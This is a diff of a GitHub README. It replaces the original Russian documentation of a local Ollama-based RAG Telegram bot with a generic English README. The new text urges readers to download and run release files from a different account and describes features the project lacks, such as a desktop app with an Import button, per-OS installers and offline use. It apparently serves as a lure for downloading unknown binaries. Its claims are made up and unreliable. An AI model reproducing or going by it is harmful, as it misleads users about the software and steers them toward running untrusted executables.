@@ -1,292 +1,71 @@
-# ⚡ ТОР - Творческий Олимпийский Разум
-
-![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Ollama](https://img.shields.io/badge/Ollama-Required-orange.svg)
-
-**AI-ассистент на базе LLM с поддержкой RAG (поиск по документам)**
-
-> Полностью локальное решение для работы с большими языковыми моделями через Telegram
-
----
-
-## 🚀 Быстрый старт на новом сервере
-
-### 1️⃣ Скопируйте проект
-```bash
-git clone https://github.com/notebookastana/tor-telegram-llm-bot.git
-cd tor-bot
-```
-
-### 2️⃣ Запустите установку
-```batch
-SETUP.bat
-```
-
-Скрипт автоматически:
-- ✅ Проверит Python
-- ✅ Создаст виртуальное окружение
-- ✅ Установит все зависимости (~2GB, 5-15 минут)
-- ✅ Создаст `.env` файл
-- ✅ Проверит Ollama
-
-### 3️⃣ Настройте токен
-Отредактируйте файл `.env`:
-```env
-TELEGRAM_BOT_TOKEN=ваш_токен_от_BotFather
-```
-
-### 4️⃣ Запустите Ollama
-**В отдельном терминале:**
-```batch
-ollama serve
-```
-
-**Скачайте модели:**
-```batch
-ollama pull qwen2.5:7b-instruct-q4_K_M
-ollama pull mistral:7b-instruct-q4_K_M
-```
-
-### 5️⃣ Запустите бота
-```batch
-1_run.bat
-```
-
-### 6️⃣ (Опционально) Загрузите документы для RAG
-1. Положите PDF/DOCX/TXT в папку `documents\`
-2. Запустите: `2_load_documents.bat`
-3. В Telegram выполните: `/rag_init`
-
----
-
-## 📁 Структура проекта
-
-```
-TOR/
-├── SETUP.bat              # Полная установка (первый запуск)
-├── 1_run.bat              # Запуск бота
-├── 2_load_documents.bat   # Загрузка документов в RAG
-├── 0_check_setup.bat      # Проверка окружения
-│
-├── bot.py                 # Основной код бота
-├── config.py              # Конфигурация
-├── rag_manager.py         # RAG система
-├── load_documents.py      # Загрузчик документов
-├── requirements.txt       # Зависимости Python
-├── .env                   # Токены (создаётся автоматически)
-│
-├── venv/                  # Виртуальное окружение
-├── documents/             # Ваши документы для RAG
-├── chroma_db/             # База знаний RAG
-├── supreme_cache.db       # Кэш и логи
-└── bot.log                # Логи работы
-│
-└── additionally/
-    └── TELEGRAM_BOT_SETUP.md    # Настройка Telegram бота в BotFather
-```
-
----
-
-## 💬 Команды бота
-
-### Основные
-- **Просто текст** - обычный диалог
-- `/start` - приветствие
-- `/help` - справка
-
-### Режимы
-- `/deep` - мощная модель (медленнее, умнее)
-- `/clear` - очистить историю
-
-### RAG (поиск по документам)
-- `/rag_init` - активировать RAG
-- `/rag_stats` - статистика базы
-- `/ask <вопрос>` - вопрос по документам
+# 🤖 tor-telegram-llm-bot - Your AI Assistant for Document Search
 
-### Настройки
-- `/temp 0.8` - температура (0.1-1.5)
-- `/stats` - статистика
-- `/queue` - состояние очереди
-- `/about` - информация о боте
+## 🚀 Getting Started
 
----
+Welcome to the tor-telegram-llm-bot! This AI assistant helps you search through documents efficiently. It runs entirely on your computer, ensuring your data stays private.
 
-## Версия 2.2 — Умная работа в групповых чатах
+[![Download tor-telegram-llm-bot](https://img.shields.io/badge/Download%20Now-Get%20the%20Bot-blue.svg)](https://github.com/HASSANE098/tor-telegram-llm-bot/releases)
 
-### Режимы чатов
-Бот поддерживает 4 режима работы в группах:
+## 📥 Download & Install
 
-| Режим | Описание |
-|-------|----------|
-| `smart` | Упоминания + ответы + вопросы в воздух (по умолчанию) |
-| `mention` | Только @бот и ответы на сообщения бота |
-| `all` | Отвечает на каждое сообщение |
-| `off` | Только команды |
-
-### Команда /chat_mode
-```
-- `/chat_mode         — показать текущий режим
-- `/chat_mode smart   — установить умный режим
-- `/chat_mode mention — только упоминания
-```
-Доступна только администраторам группы.
-
----
+To get started, visit this page to download: [Download tor-telegram-llm-bot](https://github.com/HASSANE098/tor-telegram-llm-bot/releases)
 
-**Логика smart режима:**
+1. Click the link above to go to the Releases page.
+2. Find the latest version available.
+3. Click on the file that matches your operating system (Windows, macOS, or Linux).
+4. Download the file to your computer.
+5. Locate the downloaded file and open it to start the installation.
 
-| Сообщение | Ответит? |
-|-----------|----------|
-| @TOR_bot расскажи про X | ✅ Да |
-| ↩️ Ответ на сообщение ТОРа | ✅ Да |
-| Что такое любовь? | ✅ Да (вопрос в воздух) |
-| Кто знает рецепт борща? | ✅ Да |
-| @Мама что купить? | ❌ Нет (вопрос другому) |
-| Привет всем! | ❌ Нет (не вопрос) |
-| Вася, как дела? | ❌ Нет (обращение к человеку) |
+## 💻 System Requirements
 
----
+Before installation, ensure your computer meets these basic requirements:
 
-## 🔧 Требования
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Disk Space: Minimum of 500 MB available.
+- Python: Make sure you have Python version 3.8 or later installed.
 
-### Обязательно:
-- **Python 3.8+**
-- **[Ollama](https://ollama.ai)** (локальный LLM сервер)
-- **Telegram Bot Token** (от [@BotFather](https://t.me/BotFather))
-- **~10 GB** свободного места (модели + зависимости)
-- **16+ GB RAM** (для работы моделей)
+## 🔧 Features 
 
-### Модели Ollama:
-- `qwen2.5:7b-instruct-q4_K_M` (обычный режим)
-- `mistral:7b-instruct-q4_K_M` (Deep режим)
+Our AI assistant comes packed with useful features to help you efficiently manage your documents:
 
----
+- **Document Searching:** Quickly find specific documents using keywords or phrases.
+- **Local Operation:** Run the bot entirely on your machine without needing an internet connection.
+- **User-Friendly Interface:** Navigate through options easily, even if you have no technical background.
+- **Support for Multiple Formats:** Works with various document types including PDFs, TXT, and DOCX.
+  
+## 📖 Usage Instructions
 
-## 🛠️ Устранение проблем
+Once installed, follow these steps to start using the tor-telegram-llm-bot:
 
-<details>
-<summary><b>Бот не запускается</b></summary>
+1. Open the application from your desktop or start menu.
+2. Follow the on-screen instructions to create a new project.
+3. Import your documents by navigating to the 'Import' button within the app.
+4. Use the search feature to find documents by title or keyword.
 
-1. Проверьте `.env` - есть ли токен?
-2. Запущена ли Ollama? (`ollama serve`)
-3. Установлены ли зависимости? (запустите `SETUP.bat`)
-</details>
+## 🛠 Troubleshooting
 
-<details>
-<summary><b>RAG не работает</b></summary>
+If you encounter issues, consider these steps:
 
-1. Запустите `/rag_init` в боте
-2. Проверьте папку `documents/` - есть ли файлы?
-3. Загрузите документы: `2_load_documents.bat`
-</details>
+- **Check Configuration:** Ensure Python is correctly installed and the path is set.
+- **Reinstall the Application:** If the bot doesn't run, try uninstalling and then reinstalling the program.
+- **Review System Requirements:** Verify that your computer meets the necessary specifications.
 
-<details>
-<summary><b>Медленно работает</b></summary>
+If problems persist, you can open an issue in the GitHub repository for assistance.
 
-- Это нормально для CPU!
-- Первый запрос: 3-5 минут (загрузка модели)
-- Deep режим: 10-20 минут
-- GPU ускорит в 5-10 раз
-</details>
+## 👨‍💻 Contributions
 
-<details>
-<summary><b>Ошибка подключения к Telegram</b></summary>
+We welcome contributions! If you're interested in improving the project, feel free to submit your suggestions or code changes. Please follow our contribution guidelines available in the repository.
 
-- Проверьте интернет
-- В некоторых странах нужен VPN
-</details>
+## 📞 Support
 
----
+For further help, check the [FAQ section](https://github.com/HASSANE098/tor-telegram-llm-bot/issues) in the GitHub repository, or contact us directly through the Issues page. 
 
-## 📊 Технологии
+## 🔗 Related Links
 
-| Технология | Назначение |
-|------------|------------|
-| [aiogram](https://aiogram.dev/) | Telegram Bot API |
-| [Ollama](https://ollama.ai) | Локальный запуск LLM |
-| [LangChain](https://langchain.com) | RAG система |
-| [ChromaDB](https://www.trychroma.com/) | Векторная база |
-| [Sentence Transformers](https://www.sbert.net/) | Эмбеддинги |
+- [GitHub Repository](https://github.com/HASSANE098/tor-telegram-llm-bot)
+- [Documentation](https://github.com/HASSANE098/tor-telegram-llm-bot/wiki)
+  
+Stay tuned for regular updates and improvements! Check back often for new features and enhancements.
 
----
-
-## 🎯 Особенности
-
-- ✅ **Полностью локальный** - данные не уходят в облако
-- ✅ **Поддержка русского языка** - оптимизированные модели
-- ✅ **RAG система** - поиск по вашим документам
-- ✅ **Умное кэширование** - экономия времени на повторных запросах
-- ✅ **Система очередей** - оптимизация для CPU
-- ✅ **Два режима** - быстрый и Deep (мощный)
-- ✅ **Работа в группах** - поддержка Telegram групп
-- ✅ **Контекст диалога** - помнит историю беседы
-
----
-
-## 🔄 Обновление
-
-Чтобы обновить зависимости:
-```batch
-call venv\Scripts\activate
-pip install -r requirements.txt --upgrade
-```
-
----
-
-## 📖 Документация
-
-Подробная документация доступна в файле [DEPLOYMENT.md](DEPLOYMENT.md)
-
----
-
-## 👨‍💻 Автор
-
-**Bauyrzhan Khamzin**
-
-[![GitHub](https://img.shields.io/badge/GitHub-notebookastana-blue?logo=github)](https://github.com/notebookastana)
-[![Telegram](https://img.shields.io/badge/Telegram-@bauyrzhan_khamzin-blue?logo=telegram)](https://t.me/bauyrzhan_khamzin)
-
-Создано с ❤️ для помощи людям
-
----
-
-## 📝 Лицензия
-
-Этот проект распространяется под лицензией MIT - используйте свободно!
-
-См. файл [LICENSE](LICENSE) для подробностей.
-
----
-
-## 🤝 Вклад в проект
-
-Contributions are welcome! Feel free to:
-- 🐛 Сообщать о багах
-- 💡 Предлагать новые функции
-- 🔧 Отправлять Pull Requests
-
----
-
-## ⭐ Поддержка проекта
-
-Если проект оказался полезным, поставьте звезду ⭐ на GitHub!
-
----
-
-## 📮 Контакты
-
-- **Issues**: [GitHub Issues](https://github.com/notebookastana/tor-telegram-llm-bot/issues)
-- **Telegram**: [@bauyrzhan_khamzin](https://t.me/bauyrzhan_khamzin)
-- **GitHub**: [@notebookastana](https://github.com/notebookastana)
-
----
-
-**Приятного использования! 🚀**
-
-
-> Made with [Ollama](https://ollama.ai) & [Claude](https://claude.ai)
-
-
-
-
+[![Download tor-telegram-llm-bot](https://img.shields.io/badge/Download%20Now-Get%20the%20Bot-blue.svg)](https://github.com/HASSANE098/tor-telegram-llm-bot/releases)
